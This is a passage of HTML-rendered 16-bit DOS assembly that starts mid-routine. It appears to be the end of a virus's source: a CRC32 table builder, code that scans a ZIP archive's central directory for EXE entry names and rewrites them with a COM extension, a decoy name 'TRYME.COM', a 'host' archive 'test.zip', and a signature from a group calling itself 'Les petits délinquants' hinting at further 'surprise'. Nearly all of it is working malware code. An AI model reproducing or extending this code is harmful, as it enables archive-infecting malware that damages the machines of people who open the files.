</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Crc_loop</span><span class="sc0">

</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                  </span><span class="sc1">; not the result</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                  </span><span class="sc1">; restore handle and be back!</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">starttable</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; the buffer table</span><span class="sc0">
                    </span><span class="sc1">; remember : It begin by the end</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">               </span><span class="sc1">; set bp equal 255 </span><span class="sc0">
                    </span><span class="sc1">; 255 * 4 = 1024</span><span class="sc0">
</span><span class="sc6">std</span><span class="sc0">                 </span><span class="sc1">; set Direction Flag On</span><span class="sc0">
                    
</span><span class="sc5">TableHighloop</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; the major loop in the Crc table Calc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; set the minus loop to 8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; dx = bp , major counter loop</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; ax = zero</span><span class="sc0">

</span><span class="sc5">TableLowLoop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; mov one byte of ax at right in bin</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; if anything losted , put it on dx</span><span class="sc0">

</span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">anomality</span><span class="sc0">            </span><span class="sc1">; if superior or equal skip encrypt.</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">            </span><span class="sc1">; encrypt value by a signature</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">anomality</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">TableLowLoop</span><span class="sc0">         </span><span class="sc1">; make it 8 times</span><span class="sc0">

</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; write ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; not write dx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; decrement the counter</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TableHighLoop</span><span class="sc0">           </span><span class="sc1">; repeat it until bp = 0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; last value equal 0</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">; clear direction flag          </span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_a_name</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">centraltemporary</span><span class="sc0">

</span><span class="sc5">searchnext</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">4B50h</span><span class="sc0">                         </span><span class="sc1">; if not 4B60h then there's</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_found</span><span class="sc0">                                   </span><span class="sc1">; really a problem</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">                                      </span><span class="sc1">; if cx &gt; 255</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">nextone</span><span class="sc0">                                      </span><span class="sc1">; then don't search about it</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2Eh</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'EX'</span><span class="sc0">                 </span><span class="sc1">; check if the name have  </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nextone</span><span class="sc0">                                     </span><span class="sc1">; XE as last offset if not </span><span class="sc0">
                                                </span><span class="sc1">; then skip this procedure</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2EH</span><span class="sc0">                                      </span><span class="sc1">;else then copy the file name</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporaryname</span><span class="sc0">                     </span><span class="sc1">;into temporary name with</span><span class="sc0">
                                                </span><span class="sc1">;COM extension</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go_out</span><span class="sc0">                                      </span><span class="sc1">; we finish!</span><span class="sc0">

</span><span class="sc5">nextone</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; goto to the next header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">searchnext</span><span class="sc0">

</span><span class="sc5">not_found</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; put a fake name</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">betaname</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporaryname</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                      
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">go_out</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZipCFnl</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZipFnln</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">WriteName</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; write the name</span><span class="sc0">
                                                </span><span class="sc1">; in bx handle</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZipFnln</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporaryname</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">betaname</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TRYME.COM'</span><span class="sc0">          </span><span class="sc1">; name of the file</span><span class="sc0">
</span><span class="sc5">zipfile</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'test.zip'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; name of the host of the file</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">sizeoffile</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                </span><span class="sc1">; zip informations saved</span><span class="sc0">

</span><span class="sc5">startofcentral</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                

</span><span class="sc5">sizeofcentral</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">sizeofend</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">starttable</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; for the crc32</span><span class="sc0">

</span><span class="sc5">temporaryname</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; the name </span><span class="sc0">

</span><span class="sc5">temporary1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">; for the endofcentral</span><span class="sc0">

</span><span class="sc5">centraltemporary</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; for the centraltemporary</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Improvent ? Build a vxd and correct some mistake is cool , like usual , a</span><span class="sc0">
</span><span class="sc1">;  32 bits asm crc is cool too , anyway , some surprise'll come</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Les petits dlinquants (C) Unkm98!</span><span class="sc0">
</span><span class="sc1">; </span></div></body>
</html>
